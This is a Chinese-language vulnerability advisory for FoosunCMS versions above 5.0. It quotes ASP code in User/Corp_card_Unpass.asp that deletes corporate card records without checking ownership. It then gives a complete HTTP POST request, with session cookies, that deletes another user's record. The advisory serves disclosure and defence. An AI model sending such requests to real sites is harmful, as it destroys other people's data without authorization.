@@ -1,0 +1,62 @@
+风讯网站管理系统页面越权漏洞
+
+[风讯网站管理系统页面越权漏洞 全文]
+影响版本:
+FooSun > 5.0
+
+程序介绍:
+FoosunCMS是一款具有强大的功能的基于ASP+ACCESS/MSSQL构架的内容管理软件。
+
+漏洞分析:
+
+
+在文件\User\ Corp_card_Unpass.asp中：
+ 
+If Request.Form("Action") = "Save" then //第14行
+ 
+Dim DelID,Str_Tmp,Str_Tmp1
+ 
+DelID = request.Form("CorpCardID")
+ 
+if DelID = "" then
+ 
+strShowErr = "<li>你必须选择一项再删除</li>"
+ 
+Call ReturnError(strShowErr,"")
+ 
+End if
+ 
+User_Conn.execute("Delete From FS_ME_CorpCard where CorpCardID in ("&FormatIntArr(DelID)&")")
+ 
+程序在执行删除记录时，没有验证用户的合法性导致可以任意删除他人记录。
+
+
+漏洞利用:
+
+POST /User/Corp_card_Unpass.asp HTTP/1.1
+ 
+Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/msword, application/vnd.ms-excel, application/vnd.ms-powerpoint, */*
+ 
+Accept-Language: zh-cn
+ 
+Content-Type: application/x-www-form-urlencoded
+ 
+UA-CPU: x86
+ 
+Accept-Encoding: gzip, deflate
+ 
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0; .NET CLR 2.0.50727)
+ 
+Host: aaaa.1122.org
+ 
+Content-Length: 44
+ 
+Connection: Keep-Alive
+ 
+Cache-Control: no-cache
+ 
+Cookie: FoosunSUBCookie=FoosunSUBMF=1&FoosunSUBNS=1&FoosunSUBDS=1&FoosunSUBME=1&FoosunSUBCS=1&FoosunSUBSS=1&FoosunSUBVS=1&FoosunSUBAS=1&FoosunSUBWS=1&FoosunSUBFL=1; FoosunDSCookies=FoosunDSLinkType=0&FoosunDSIndexTemplet=%2FTemplets%2Fdown%2Findex%2Ehtm&FoosunDSIndexPage=index%2Ehtml&FoosunDSDownDir=down&FoosunDSDomain=&FoosunDSOverDueMode=1&FoosunDSIPList=&FoosunDSIPType=1&FoosunDSLock=1; FoosunNSCookies=FoosunNSSiteName=%D0%C2%CE%C5%CF%B5%CD%B3&FoosunNSLinkType=0&FoosunNSIndexTemplet=%2FTemplets%2FNewsClass%2Findex%2Ehtm&FoosunNSIndexPage=index%2Ehtml&FoosunNSNewsDir=%2F&FoosunNSDomain=; FoosunMFCookies=FoosunMFCopyright=%CB%C4%B4%A8%B7%E7%D1%B6%BF%C6%BC%BC%B7%A2%D5%B9%D3%D0%CF%DE%B9%AB%CB%BE%B0%E6%C8%A8%CB%F9%D3%D0%A3%A1&FoosunMFIndexFileName=index%2Ehtml&FoosunMFIndexTemplet=%2FTemplets%2FIndex%2Ehtm&FoosunMFWriteType=0&FoosunMFPicClassid=9&FoosunMFMarkType=1&FoosunMFEmail=service%40foosun%2Ecn&FoosunMFVersion=4%2E0+Sp5&FoosunMFsiteName=%CB%C4%B4%A8%B7%E7%D1%B6%BF%C6%BC%BC%B7%A2%D5%B9%D3%D0%CF%DE%B9%AB%CB%BE&FoosunMFDomain=localhost; FoosunSearchCookie=Cookie%5FSite%5FName=%CB%C4%B4%A8%B7%E7%D1%B6%BF%C6%BC%BC%B7%A2%D5%B9%D3%D0%CF%DE%B9%AB%CB%BE&Cookie%5FeMail=service%40foosun%2Ecn&Cookie%5FCopyright=%CB%C4%B4%A8%B7%E7%D1%B6%BF%C6%BC%BC%B7%A2%D5%B9%D3%D0%CF%DE%B9%AB%CB%BE%B0%E6%C8%A8%CB%F9%D3%D0%A3%A1&Cookie%5FDomain=localhost; ASPSESSIONIDASRRTCAB=BAKHNIGDKFJEDAMHFGBFJEPB; FoosunUserCookies=UserLogin%5FStyle%5FNum=2; FoosunUserlCookies=FS%5FUser%5FLogin%5FNumber=0; ASPSESSIONIDCQRQSDBB=MKKBHBIDCLJIMJGOLIMJPDAC
+ 
+ 
+Action=Save&CorpCardID=1&Submit=%CC%E1%BD%BB
+
